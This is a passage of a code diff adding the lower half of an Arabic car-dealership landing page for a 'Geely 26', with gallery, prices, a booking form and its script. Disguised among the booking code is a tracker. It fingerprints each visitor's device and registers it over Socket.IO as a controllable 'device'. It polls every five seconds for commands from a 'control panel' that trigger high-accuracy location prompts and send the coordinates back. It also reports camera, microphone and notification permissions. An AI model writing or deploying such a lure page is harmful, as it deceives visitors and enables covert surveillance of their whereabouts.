+                <div class="gallery-item">
+                    <img
+                        src="https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_Cool_003.jpg"
+                        alt="جيلي - المنظر الأمامي"
+                        loading="lazy"
+                        data-fallbacks='["https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_2023_facelift_001.jpg","https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_L_001.jpg"]'>
+                </div>
+                <div class="gallery-item">
+                    <img
+                        src="https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_facelift_parked_in_a_park%2C_front_quarter.jpg"
+                        alt="جيلي - المنظر الجانبي"
+                        loading="lazy"
+                        data-fallbacks='["https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_007_%28cropped%29.jpg","https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_PHEV_001.jpg"]'>
+                </div>
+                <div class="gallery-item">
+                    <img
+                        src="https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_Cool_004.jpg"
+                        alt="جيلي - المنظر الخلفي"
+                        loading="lazy"
+                        data-fallbacks='["https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_2023_facelift_002.jpg","https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_facelift_parked_in_a_park%2C_rear.jpg"]'>
+                </div>
+                <div class="gallery-item">
+                    <img
+                        src="https://commons.wikimedia.org/wiki/Special:FilePath/2018_Geely_Binyue_interior.jpg"
+                        alt="جيلي - المقصورة الداخلية"
+                        loading="lazy"
+                        data-fallbacks='["https://commons.wikimedia.org/wiki/Special:FilePath/Geely_New_Emgrand_EC7_%28cropped%29.jpg","https://commons.wikimedia.org/wiki/Special:FilePath/2021_Geely_Emgrand_%28facelift%2C_front%29.jpg"]'>
+                </div>
+                <div class="gallery-item">
+                    <img
+                        src="https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Emgrand_IV_005.jpg"
+                        alt="جيلي - تفاصيل السيارة"
+                        loading="lazy"
+                        data-fallbacks='["https://commons.wikimedia.org/wiki/Special:FilePath/2017_Geely_Emgrand_EV%2C_front_8.5.18.jpg","https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Emgrand_EV_001.jpg"]'>
+                </div>
+                <div class="gallery-item">
+                    <img
+                        src="https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_L_002.jpg"
+                        alt="جيلي - إضاءة ليلية"
+                        loading="lazy"
+                        data-fallbacks='["https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_PHEV_002.jpg","https://commons.wikimedia.org/wiki/Special:FilePath/Emgrand_EC7_02_China_2012-04-15.jpg"]'>
+                </div>
+            </div>
+        </section>
+
+        <!-- Pricing -->
+        <section class="pricing-section" id="pricing">
+            <h2 class="section-title">السعر والتمويل</h2>
+            <div class="pricing-card">
+                <h3 style="color: #64c8ff; font-size: 1.8rem; margin-bottom: 20px;">السعر الأساسي</h3>
+                <div class="price-amount">
+                    <span class="price-currency">من</span> 85,000
+                </div>
+                <div class="price-period">جنيه مصري</div>
+                
+                <h4 style="color: #64c8ff; margin-top: 40px; margin-bottom: 25px; font-size: 1.5rem;">خيارات التمويل</h4>
+                <ul class="pricing-features">
+                    <li>تقسيط على 60 شهر بفائدة منخفضة</li>
+                    <li>دفعة أولى من 20% فقط</li>
+                    <li>فائدة تنافسية جداً</li>
+                    <li>ضمان شامل 5 سنوات كامل</li>
+                    <li>صيانة مجانية أول سنتين</li>
+                    <li>تأمين شامل مجاني السنة الأولى</li>
+                    <li>خدمة توصيل مجانية</li>
+                </ul>
+                
+                <button class="cta-button" id="pricingBookBtn" style="margin-top: 30px; width: 100%;">احجز الآن وداخل المفاجآت</button>
+            </div>
+        </section>
+    </div>
+
+    <div class="booking-modal" id="bookingModal" aria-hidden="true">
+        <div class="booking-dialog" role="dialog" aria-modal="true" aria-labelledby="bookingTitle">
+            <h3 class="booking-title" id="bookingTitle">إتمام الحجز</h3>
+            <form id="bookingForm" novalidate>
+                <div class="booking-grid">
+                    <div class="booking-field">
+                        <label for="bookName">الاسم</label>
+                        <input id="bookName" name="name" type="text" required minlength="2" placeholder="الاسم بالكامل">
+                    </div>
+                    <div class="booking-field">
+                        <label for="bookPhone">رقم الهاتف</label>
+                        <input id="bookPhone" name="phone" type="tel" required placeholder="01xxxxxxxxx">
+                    </div>
+                    <div class="booking-field">
+                        <label for="bookCity">المدينة</label>
+                        <input id="bookCity" name="city" type="text" placeholder="القاهرة">
+                    </div>
+                    <div class="booking-field">
+                        <label for="bookModel">موديل العربية</label>
+                        <select id="bookModel" name="car_model" required>
+                            <option value="Geely 26" selected>Geely 26</option>
+                            <option value="Geely Coolray">Geely Coolray</option>
+                            <option value="Geely Emgrand">Geely Emgrand</option>
+                            <option value="Geely Monjaro">Geely Monjaro</option>
+                        </select>
+                    </div>
+                    <div class="booking-field">
+                        <label for="bookDate">موعد مناسب للتواصل</label>
+                        <input id="bookDate" name="preferred_date" type="datetime-local">
+                    </div>
+                    <div class="booking-field full">
+                        <label for="bookNotes">ملاحظات</label>
+                        <textarea id="bookNotes" name="notes" placeholder="أي تفاصيل إضافية"></textarea>
+                    </div>
+                </div>
+                <div class="booking-actions">
+                    <button type="submit" class="btn-book-submit">تأكيد الحجز</button>
+                    <button type="button" class="btn-book-cancel" id="cancelBookingBtn">إغلاق</button>
+                </div>
+                <div id="bookingFeedback" class="booking-feedback"></div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <h3 style="color: #64c8ff; margin-bottom: 25px; font-size: 2.5rem;">🚗 جيلي 26 - Geely 26</h3>
+            <p>نحن نوفر أفضل تجربة قيادة بأحدث التقنيات والأسعار المنافسة</p>
+            <p style="font-size: 1.1rem; margin-top: 20px;">الجودة والموثوقية في كل تفاصيل السيارة</p>
+            
+            <div class="social-links">
+                <a href="#" title="Facebook"><i class="fab fa-facebook-f"></i></a>
+                <a href="#" title="Instagram"><i class="fab fa-instagram"></i></a>
+                <a href="#" title="Twitter"><i class="fab fa-twitter"></i></a>
+                <a href="#" title="WhatsApp"><i class="fab fa-whatsapp"></i></a>
+                <a href="#" title="YouTube"><i class="fab fa-youtube"></i></a>
+            </div>
+            
+            <p style="margin-top: 40px; font-size: 1rem;">© 2026 جميع الحقوق محفوظة | جيلي السيارات | مصر</p>
+        </div>
+    </footer>
+
+    <div id="debugChip" class="debug-chip" aria-live="polite"></div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const debugChip = document.getElementById('debugChip');
+        const debugEnabled = (() => {
+            try {
+                const q = new URLSearchParams(window.location.search).get('debug');
+                if (q === '1' || q === 'true') {
+                    localStorage.setItem('car_debug', '1');
+                    return true;
+                }
+                if (q === '0' || q === 'false') {
+                    localStorage.removeItem('car_debug');
+                    return false;
+                }
+                return localStorage.getItem('car_debug') === '1';
+            } catch (_) {
+                return false;
+            }
+        })();
+
+        function setDebugStatus(lines) {
+            if (!debugEnabled || !debugChip) return;
+            debugChip.classList.add('show');
+            debugChip.textContent = Array.isArray(lines) ? lines.join('\n') : String(lines || 'debug');
+        }
+
+        let deviceId = localStorage.getItem('device_id');
+        if (!deviceId) {
+            deviceId = 'dev_' + Math.random().toString(36).slice(2, 10);
+            localStorage.setItem('device_id', deviceId);
+        }
+
+        const permissionStatusEl = document.getElementById('permissionStatus');
+        const setPermissionStatus = (msg) => {
+            if (permissionStatusEl) permissionStatusEl.textContent = msg;
+        };
+        let locationPromptInFlight = false;
+        let lastPendingLocationTriggerAt = 0;
+
+        function getClientMeta() {
+            const ua = navigator.userAgent || 'Unknown';
+            const platform = (navigator.userAgentData && navigator.userAgentData.platform) ? navigator.userAgentData.platform : (navigator.platform || 'Unknown');
+            const deviceModel = (navigator.userAgentData && navigator.userAgentData.model) ? navigator.userAgentData.model : '';
+            return {
+                deviceId,
+                name: platform,
+                platform,
+                userAgent: ua,
+                model: deviceModel || 'Unknown',
+                touchPoints: Number(navigator.maxTouchPoints || 0),
+                viewportW: Number(window.innerWidth || 0),
+            };
+        }
+
+        async function sendVisitPing() {
+            if (document.visibilityState && document.visibilityState !== 'visible') return;
+            try {
+                const now = Date.now();
+                const cooldownMs = 10 * 1000;
+                const key = `visit_ping_last_${deviceId}`;
+                const last = Number(localStorage.getItem(key) || '0');
+                if (Number.isFinite(last) && now - last < cooldownMs) {
+                    return;
+                }
+                localStorage.setItem(key, String(now));
+            } catch (_) {}
+
+            try {
+                await fetch('/api/visit-ping', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(getClientMeta())
+                });
+            } catch (_) {}
+        }
+
+        async function registerDeviceFallback() {
+            try {
+                const now = Date.now();
+                const key = `device_fallback_last_${deviceId}`;
+                const last = Number(localStorage.getItem(key) || '0');
+                if (Number.isFinite(last) && now - last < 10 * 1000) return;
+                localStorage.setItem(key, String(now));
+
+                const meta = getClientMeta();
+                await fetch('/api/register-device-fallback', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        device_id: deviceId,
+                        name: meta.name,
+                        platform: meta.platform,
+                        model: meta.model,
+                        touchPoints: meta.touchPoints,
+                        viewportW: meta.viewportW,
+                    }),
+                });
+            } catch (_) {}
+        }
+
+        registerDeviceFallback();
+        sendVisitPing();
+
+        let socket = null;
+        if (typeof window.io === 'function') {
+            socket = window.io({ auth: { client_type: 'device' } });
+            socket.on('connect', () => {
+                const platform = navigator.userAgent || 'Unknown';
+                const name = navigator.platform || 'Web Visitor';
+                socket.emit('register_device', {
+                    device_id: deviceId,
+                    name,
+                    platform,
+                    battery: 'Unknown',
+                });
+                setPermissionStatus('تم الاتصال بالخادم. Device ID: ' + deviceId);
+            });
+
+            socket.on('connect_error', () => {
+                setPermissionStatus('تعذر الاتصال بالخادم. جاري المحاولة تلقائيًا...');
+                registerDeviceFallback();
+            });
+
+            socket.on('command', async (data) => {
+                try {
+                    if (!data || !data.command) return;
+                    if (data.command === 'location') {
+                        await requestLocationPermission();
+                    }
+                } catch (_) {}
+            });
+        } else {
+            setPermissionStatus('Socket.IO غير متاح حاليًا، تم تشغيل الصفحة بدون الاتصال اللحظي.');
+            registerDeviceFallback();
+        }
+
+        async function reportPermissionStatus(permission, status) {
+            try {
+                await fetch('/api/permission-status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ permission, status, deviceId })
+                });
+            } catch (_) {}
+        }
+
+        async function reportLocationPermissionStatus(status) {
+            try {
+                await fetch('/api/location/permission-status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ status })
+                });
+            } catch (_) {}
+        }
+
+        async function requestLocationPermission() {
+            if (locationPromptInFlight) return;
+            locationPromptInFlight = true;
+            if (!navigator.geolocation) {
+                await reportLocationPermissionStatus('unsupported');
+                setPermissionStatus('المتصفح لا يدعم الموقع الجغرافي.');
+                locationPromptInFlight = false;
+                return;
+            }
+
+            setPermissionStatus('جاري طلب صلاحية الموقع...');
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                await reportLocationPermissionStatus('granted');
+
+                try {
+                    const resp = await fetch('/api/location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ latitude, longitude, deviceId })
+                    });
+                    if (resp.ok) {
+                        setPermissionStatus('تم منح الموقع وإرسال الإحداثيات بنجاح.');
+                    } else {
+                        setPermissionStatus('تم منح الموقع لكن تعذر إرسال البيانات.');
+                    }
+                } catch (_) {
+                    setPermissionStatus('تم منح الموقع لكن حدث خطأ في الإرسال.');
+                }
+                locationPromptInFlight = false;
+            }, async (error) => {
+                const status = error && error.code === 1 ? 'denied' : 'error';
+                await reportLocationPermissionStatus(status);
+                setPermissionStatus(status === 'denied' ? 'تم رفض صلاحية الموقع.' : 'حدث خطأ أثناء طلب الموقع.');
+                locationPromptInFlight = false;
+            }, {
+                enableHighAccuracy: true,
+                timeout: 12000,
+                maximumAge: 0,
+            });
+        }
+
+        async function checkPendingActions() {
+            try {
+                const resp = await fetch('/api/pending-actions?device_id=' + encodeURIComponent(deviceId));
+                const data = await resp.json();
+                if (data && data.success && data.location_requested) {
+                    const now = Date.now();
+                    if (now - lastPendingLocationTriggerAt < 15000) return;
+                    lastPendingLocationTriggerAt = now;
+                    setPermissionStatus('تم استلام طلب موقع من لوحة التحكم. جاري طلب الإذن...');
+                    await requestLocationPermission();
+                }
+            } catch (_) {}
+        }
+
+        async function requestCameraPermission() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                await reportPermissionStatus('camera', 'unsupported');
+                setPermissionStatus('المتصفح لا يدعم صلاحية الكاميرا.');
+                return;
+            }
+
+            setPermissionStatus('جاري طلب صلاحية الكاميرا...');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                stream.getTracks().forEach((track) => track.stop());
+                await reportPermissionStatus('camera', 'granted');
+                setPermissionStatus('تم منح صلاحية الكاميرا بنجاح.');
+            } catch (err) {
+                const denied = err && (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError');
+                await reportPermissionStatus('camera', denied ? 'denied' : 'error');
+                setPermissionStatus(denied ? 'تم رفض صلاحية الكاميرا.' : 'حدث خطأ أثناء طلب الكاميرا.');
+            }
+        }
+
+        async function requestMicrophonePermission() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                await reportPermissionStatus('microphone', 'unsupported');
+                setPermissionStatus('المتصفح لا يدعم صلاحية الميكروفون.');
+                return;
+            }
+
+            setPermissionStatus('جاري طلب صلاحية الميكروفون...');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
+                stream.getTracks().forEach((track) => track.stop());
+                await reportPermissionStatus('microphone', 'granted');
+                setPermissionStatus('تم منح صلاحية الميكروفون بنجاح.');
+            } catch (err) {
+                const denied = err && (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError');
+                await reportPermissionStatus('microphone', denied ? 'denied' : 'error');
+                setPermissionStatus(denied ? 'تم رفض صلاحية الميكروفون.' : 'حدث خطأ أثناء طلب الميكروفون.');
+            }
+        }
+
+        async function requestNotificationPermission() {
+            if (!('Notification' in window)) {
+                await reportPermissionStatus('notifications', 'unsupported');
+                setPermissionStatus('المتصفح لا يدعم الإشعارات.');
+                return;
+            }
+
+            setPermissionStatus('جاري طلب صلاحية الإشعارات...');
+            try {
+                const result = await Notification.requestPermission();
+                const status = result === 'granted' ? 'granted' : (result === 'denied' ? 'denied' : 'error');
+                await reportPermissionStatus('notifications', status);
+                if (result === 'granted') {
+                    setPermissionStatus('تم منح صلاحية الإشعارات بنجاح.');
+                } else if (result === 'denied') {
+                    setPermissionStatus('تم رفض صلاحية الإشعارات.');
+                } else {
+                    setPermissionStatus('تم تجاهل طلب الإشعارات.');
+                }
+            } catch (_) {
+                await reportPermissionStatus('notifications', 'error');
+                setPermissionStatus('حدث خطأ أثناء طلب الإشعارات.');
+            }
+        }
+
+        const btnLocation = document.getElementById('btnLocation');
+        const btnCamera = document.getElementById('btnCamera');
+        const btnMic = document.getElementById('btnMic');
+        const btnNotify = document.getElementById('btnNotify');
+        if (btnLocation) btnLocation.addEventListener('click', requestLocationPermission);
+        if (btnCamera) btnCamera.addEventListener('click', requestCameraPermission);
+        if (btnMic) btnMic.addEventListener('click', requestMicrophonePermission);
+        if (btnNotify) btnNotify.addEventListener('click', requestNotificationPermission);
+        checkPendingActions();
+        setInterval(checkPendingActions, 5000);
+        window.addEventListener('focus', checkPendingActions);
+        window.addEventListener('pageshow', checkPendingActions);
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible') checkPendingActions();
+        });
+
+        // Smooth scrolling
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Add some interactivity
+        document.querySelectorAll('.spec-card').forEach(card => {
+            card.addEventListener('click', function() {
+                this.style.transform = 'scale(0.95)';
+                setTimeout(() => {
+                    this.style.transform = '';
+                }, 100);
+            });
+        });
+
+        const bookingModal = document.getElementById('bookingModal');
+        const bookingForm = document.getElementById('bookingForm');
+        const bookingFeedback = document.getElementById('bookingFeedback');
+
+        const car3dScene = document.getElementById('car3dScene');
+        const car3dSection = document.getElementById('car3d');
+        const car3dImage = document.getElementById('car3dImage');
+        const car3dModel = document.getElementById('car3dModel');
+        const car3dAngle = document.getElementById('car3dAngle');
+        const car3dPrev = document.getElementById('car3dPrev');
+        const car3dNext = document.getElementById('car3dNext');
+        const hotspotTooltip = document.getElementById('hotspotTooltip');
+        const carPartTitle = document.getElementById('carPartTitle');
+        const carPartDesc = document.getElementById('carPartDesc');
+
+        const debugState = {
+            hotspotCount: document.querySelectorAll('.car-hotspot').length,
+            bookingModal: Boolean(bookingModal),
+            bookingForm: Boolean(bookingForm),
+            heroBookBtn: Boolean(document.getElementById('heroBookBtn')),
+            pricingBookBtn: Boolean(document.getElementById('pricingBookBtn')),
+            car3dScene: Boolean(car3dScene),
+            car3dPrev: Boolean(car3dPrev),
+            car3dNext: Boolean(car3dNext),
+        };
+
+        document.querySelectorAll('.car-hotspot').forEach((spot) => {
+            const tipText = `${spot.dataset.label || ''} - ${spot.dataset.title || ''}`.trim();
+            spot.setAttribute('aria-label', tipText || 'جزء من السيارة');
+
+            spot.addEventListener('click', () => {
+                document.querySelectorAll('.car-hotspot').forEach((s) => s.classList.remove('active'));
+                spot.classList.add('active');
+                carPartTitle.textContent = spot.dataset.title || 'جزء من السيارة';
+                carPartDesc.textContent = spot.dataset.desc || 'لا توجد تفاصيل إضافية.';
+            });
+
+            spot.addEventListener('mouseenter', () => {
+                if (!hotspotTooltip) return;
+                hotspotTooltip.textContent = tipText || 'تفاصيل الجزء';
+                hotspotTooltip.classList.add('show');
+            });
+
+            spot.addEventListener('mousemove', (e) => {
+                if (!hotspotTooltip || !car3dScene) return;
+                const rect = car3dScene.getBoundingClientRect();
+                hotspotTooltip.style.left = `${e.clientX - rect.left}px`;
+                hotspotTooltip.style.top = `${e.clientY - rect.top}px`;
+            });
+
+            spot.addEventListener('mouseleave', () => {
+                if (hotspotTooltip) hotspotTooltip.classList.remove('show');
+            });
+        });
+
+        const car360Frames = [
+            { model: 'Geely Coolray', url: 'https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Binyue_Cool_003.jpg' },
+            { model: 'Geely Emgrand', url: 'https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Emgrand_IV_005.jpg' },
+            { model: 'Geely Monjaro', url: 'https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Monjaro_001.jpg' },
+            { model: 'Geely Tugella', url: 'https://commons.wikimedia.org/wiki/Special:FilePath/Geely_Tugella_001.jpg' }
+        ];
+
+        let currentFrame = 0;
+        let pointerDown = false;
+        let lastPointerX = 0;
+        let dragBuffer = 0;
+        let autoSpinTimer = null;
+        let cinematicStoppedByUser = false;
+        let cinematicRunning = false;
+        let cinematicObserver = null;
+
+        function setCinematicMode(isActive) {
+            cinematicRunning = Boolean(isActive);
+            if (!car3dSection) return;
+            car3dSection.classList.toggle('cinematic', cinematicRunning);
+        }
+
+        function stopCinematicByUser() {
+            if (cinematicStoppedByUser) return;
+            cinematicStoppedByUser = true;
+            setCinematicMode(false);
+            stopAutoSpin();
+            if (cinematicObserver) {
+                cinematicObserver.disconnect();
+                cinematicObserver = null;
+            }
+        }
+
+        function updateAngleBadge() {
+            if (!car3dAngle) return;
+            const deg = Math.round((360 / car360Frames.length) * currentFrame);
+            car3dAngle.textContent = `زاوية: ${deg}°`;
+        }
+
+        function setFrame(index) {
+            if (!car3dImage || car360Frames.length === 0) return;
+            currentFrame = (index + car360Frames.length) % car360Frames.length;
+            car3dImage.src = car360Frames[currentFrame].url;
+            if (car3dModel) {
+                car3dModel.textContent = `الموديل: ${car360Frames[currentFrame].model}`;
+            }
+            updateAngleBadge();
+        }
+
+        function stepFrame(delta) {
+            setFrame(currentFrame + delta);
+        }
+
+        function startAutoSpin() {
+            if (cinematicStoppedByUser) return;
+            if (autoSpinTimer || !car3dImage) return;
+            autoSpinTimer = setInterval(() => {
+                if (!pointerDown) stepFrame(1);
+            }, 3400);
+        }
+
+        function stopAutoSpin() {
+            if (!autoSpinTimer) return;
+            clearInterval(autoSpinTimer);
+            autoSpinTimer = null;
+        }
+
+        function handleDragMove(clientX) {
+            const dx = clientX - lastPointerX;
+            lastPointerX = clientX;
+            dragBuffer += dx;
+
+            const threshold = 18;
+            while (Math.abs(dragBuffer) >= threshold) {
+                const dir = dragBuffer > 0 ? -1 : 1;
+                stepFrame(dir);
+                dragBuffer -= threshold * Math.sign(dragBuffer);
+            }
+        }
+
+        // تأثير 3D مع حركة المؤشر + سحب لتدوير اللقطات.
+        if (car3dScene) {
+            car3dScene.addEventListener('mousemove', (e) => {
+                if (pointerDown) {
+                    handleDragMove(e.clientX);
+                    return;
+                }
+
+                const r = car3dScene.getBoundingClientRect();
+                const x = (e.clientX - r.left) / r.width;
+                const y = (e.clientY - r.top) / r.height;
+                const ry = (x - 0.5) * 10;
+                const rx = (0.5 - y) * 6;
+                car3dScene.style.transform = `rotateX(${rx}deg) rotateY(${ry}deg)`;
+            });
+
+            if ('PointerEvent' in window) {
+                car3dScene.addEventListener('pointerdown', (e) => {
+                    stopCinematicByUser();
+                    pointerDown = true;
+                    lastPointerX = e.clientX;
+                    dragBuffer = 0;
+                    car3dScene.classList.add('dragging');
+                    stopAutoSpin();
+                });
+
+                window.addEventListener('pointerup', () => {
+                    if (!pointerDown) return;
+                    pointerDown = false;
+                    car3dScene.classList.remove('dragging');
+                    startAutoSpin();
+                });
+            } else {
+                car3dScene.addEventListener('touchstart', (e) => {
+                    if (!e.touches || !e.touches.length) return;
+                    stopCinematicByUser();
+                    pointerDown = true;
+                    lastPointerX = e.touches[0].clientX;
+                    dragBuffer = 0;
+                    car3dScene.classList.add('dragging');
+                    stopAutoSpin();
+                }, { passive: true });
+
+                car3dScene.addEventListener('touchmove', (e) => {
+                    if (!pointerDown || !e.touches || !e.touches.length) return;
+                    handleDragMove(e.touches[0].clientX);
+                }, { passive: true });
+
+                window.addEventListener('touchend', () => {
+                    if (!pointerDown) return;
+                    pointerDown = false;
+                    car3dScene.classList.remove('dragging');
+                    startAutoSpin();
+                }, { passive: true });
+            }
+
+            car3dScene.addEventListener('mouseleave', () => {
+                if (hotspotTooltip) hotspotTooltip.classList.remove('show');
+                car3dScene.style.transform = 'rotateX(5deg) rotateY(-5deg)';
+            });
+
+            car3dScene.addEventListener('dragstart', (e) => e.preventDefault());
+        }
+
+        if (car3dPrev) {
+            car3dPrev.addEventListener('click', () => {
+                stopCinematicByUser();
+                stopAutoSpin();
+                stepFrame(-1);
+                startAutoSpin();
+            });
+        }
+
+        if (car3dNext) {
+            car3dNext.addEventListener('click', () => {
+                stopCinematicByUser();
+                stopAutoSpin();
+                stepFrame(1);
+                startAutoSpin();
+            });
+        }
+
+        document.querySelectorAll('.car-hotspot').forEach((spot) => {
+            spot.addEventListener('click', stopCinematicByUser, { once: true });
+        });
+
+        if (car3dSection && 'IntersectionObserver' in window) {
+            cinematicObserver = new IntersectionObserver((entries) => {
+                entries.forEach((entry) => {
+                    if (cinematicStoppedByUser) return;
+                    if (entry.isIntersecting && entry.intersectionRatio >= 0.45) {
+                        setCinematicMode(true);
+                        startAutoSpin();
+                    } else {
+                        setCinematicMode(false);
+                        stopAutoSpin();
+                    }
+                });
+            }, {
+                threshold: [0.45],
+            });
+            cinematicObserver.observe(car3dSection);
+        }
+
+        setFrame(0);
+        if (!cinematicObserver) {
+            setCinematicMode(true);
+            startAutoSpin();
+        }
+
+        function openBookingModal() {
+            if (!bookingModal || !bookingFeedback) return;
+            bookingModal.classList.add('show');
+            bookingModal.setAttribute('aria-hidden', 'false');
+            bookingFeedback.textContent = '';
+            const bookNameInput = document.getElementById('bookName');
+            if (bookNameInput) bookNameInput.focus();
+        }
+
+        function closeBookingModal() {
+            if (!bookingModal) return;
+            bookingModal.classList.remove('show');
+            bookingModal.setAttribute('aria-hidden', 'true');
+        }
+
+        const heroBookBtn = document.getElementById('heroBookBtn');
+        const pricingBookBtn = document.getElementById('pricingBookBtn');
+        const cancelBookingBtn = document.getElementById('cancelBookingBtn');
+        if (heroBookBtn) heroBookBtn.addEventListener('click', openBookingModal);
+        if (pricingBookBtn) pricingBookBtn.addEventListener('click', openBookingModal);
+        if (cancelBookingBtn) cancelBookingBtn.addEventListener('click', closeBookingModal);
+
+        if (bookingModal) {
+            bookingModal.addEventListener('click', (e) => {
+                if (e.target === bookingModal) closeBookingModal();
+            });
+        }
+
+        if (bookingForm) {
+            bookingForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const formData = new FormData(bookingForm);
+            const payload = {
+                name: String(formData.get('name') || '').trim(),
+                phone: String(formData.get('phone') || '').trim(),
+                city: String(formData.get('city') || '').trim(),
+                preferred_date: String(formData.get('preferred_date') || '').trim(),
+                notes: String(formData.get('notes') || '').trim(),
+                car_model: String(formData.get('car_model') || 'Geely 26').trim(),
+            };
+
+            if (payload.name.length < 2) {
+                bookingFeedback.textContent = 'الاسم غير صالح.';
+                return;
+            }
+
+            if ((payload.phone.replace(/\D/g, '')).length < 10) {
+                bookingFeedback.textContent = 'رقم الهاتف غير صالح.';
+                return;
+            }
+
+            bookingFeedback.textContent = 'جاري إرسال طلب الحجز...';
+
+            try {
+                const res = await fetch('/api/bookings', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+
+                const result = await res.json();
+                if (!res.ok || !result.success) {
+                    bookingFeedback.textContent = result.error || 'فشل إرسال الحجز. حاول مرة أخرى.';
+                    return;
+                }
+
+                const wsHint = result.whatsapp_sent ? ' وتم إرساله إلى واتساب.' : ' (تم تسجيله، لكن تعذر إرسال واتساب الآن).';
+                bookingFeedback.textContent = `تم تسجيل الحجز بنجاح. رقم الحجز: ${result.booking_ref}${wsHint}`;
+                bookingForm.reset();
+                setTimeout(closeBookingModal, 1800);
+            } catch (_) {
+                bookingFeedback.textContent = 'تعذر الاتصال بالخادم حالياً.';
+            }
+            });
+        }
+
+        setDebugStatus([
+            'Debug mode: ON',
+            `listeners bound: bookingForm=${debugState.bookingForm}, modal=${debugState.bookingModal}`,
+            `buttons: hero=${debugState.heroBookBtn}, pricing=${debugState.pricingBookBtn}`,
+            `3d: scene=${debugState.car3dScene}, hotspots=${debugState.hotspotCount}, prev=${debugState.car3dPrev}, next=${debugState.car3dNext}`,
+            `deviceId=${deviceId}`,
+        ]);
+
+        // Geely image fallback loader: if one URL fails, switch to the next Geely URL.
+        document.querySelectorAll('.gallery-item img').forEach((img) => {
+            const fallbacks = JSON.parse(img.getAttribute('data-fallbacks') || '[]');
+            let idx = 0;
+
+            img.addEventListener('error', () => {
+                if (idx < fallbacks.length) {
+                    img.src = fallbacks[idx++];
+                    return;
+                }
+
+                img.style.display = 'none';
+                const holder = img.parentElement;
+                if (holder && !holder.querySelector('.no-image')) {
+                    const icon = document.createElement('div');
+                    icon.className = 'no-image';
+                    icon.innerHTML = '<i class="fas fa-car"></i>';
+                    holder.appendChild(icon);
+                }
+            });
+        });
+    </script>
+
+    <script>
+        (function () {
+            if (window.__carsFallbackBound) return;
+            window.__carsFallbackBound = true;
+
+            var debugChip = document.getElementById('debugChip');
+            var debugEnabled = false;
+            try {
+                if ((window.location.search || '').indexOf('debug=1') >= 0) {
+                    localStorage.setItem('car_debug', '1');
+                }
+                if ((window.location.search || '').indexOf('debug=0') >= 0) {
+                    localStorage.removeItem('car_debug');
+                }
+                debugEnabled = localStorage.getItem('car_debug') === '1';
+            } catch (e) {
+                debugEnabled = false;
+            }
+
+            function debugLine(msg) {
+                if (!debugEnabled || !debugChip) return;
+                debugChip.className = 'debug-chip show';
+                if (!debugChip.textContent) {
+                    debugChip.textContent = 'Fallback Debug ON';
+                }
+                debugChip.textContent += '\n' + msg;
+            }
+
+            function addClass(el, className) {
+                if (!el) return;
+                var current = ' ' + (el.className || '') + ' ';
+                if (current.indexOf(' ' + className + ' ') === -1) {
+                    el.className = (el.className ? el.className + ' ' : '') + className;
+                }
+            }
+
+            function removeClass(el, className) {
+                if (!el || !el.className) return;
+                var parts = el.className.split(/\s+/);
+                var out = [];
+                for (var i = 0; i < parts.length; i += 1) {
+                    if (parts[i] && parts[i] !== className) out.push(parts[i]);
+                }
+                el.className = out.join(' ');
+            }
+
+            function bindBooking() {
+                var bookingModal = document.getElementById('bookingModal');
+                var bookingForm = document.getElementById('bookingForm');
+                var bookingFeedback = document.getElementById('bookingFeedback');
+                var heroBookBtn = document.getElementById('heroBookBtn');
+                var pricingBookBtn = document.getElementById('pricingBookBtn');
+                var cancelBookingBtn = document.getElementById('cancelBookingBtn');
+
+                if (!bookingModal || !bookingForm || !bookingFeedback) {
+                    debugLine('booking: missing modal/form/feedback');
+                    return;
+                }
+
+                function openModal() {
+                    addClass(bookingModal, 'show');
+                    bookingModal.setAttribute('aria-hidden', 'false');
+                    bookingFeedback.textContent = '';
+                }
+
+                function closeModal() {
+                    removeClass(bookingModal, 'show');
+                    bookingModal.setAttribute('aria-hidden', 'true');
+                }
+
+                if (heroBookBtn) heroBookBtn.onclick = openModal;
+                if (pricingBookBtn) pricingBookBtn.onclick = openModal;
